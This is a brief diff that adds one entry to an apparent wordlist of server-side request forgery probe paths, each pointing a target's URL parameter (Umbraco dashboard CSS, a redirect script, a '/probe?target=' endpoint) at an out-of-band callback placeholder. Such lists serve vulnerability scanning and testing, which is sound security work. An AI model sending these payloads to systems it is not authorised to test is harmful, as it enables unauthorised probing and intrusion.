@@ -71,3 +71,4 @@
 /umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardCss?section=AvoidGetCacheItem&baseUrl=http://{{interactsh-url}}/
 /urve/site/login.html?lang=en
 /_internal/redirect.php?url=http://{{interactsh-url}}
+/probe?target={{interactsh-url}}&module=http_2xx
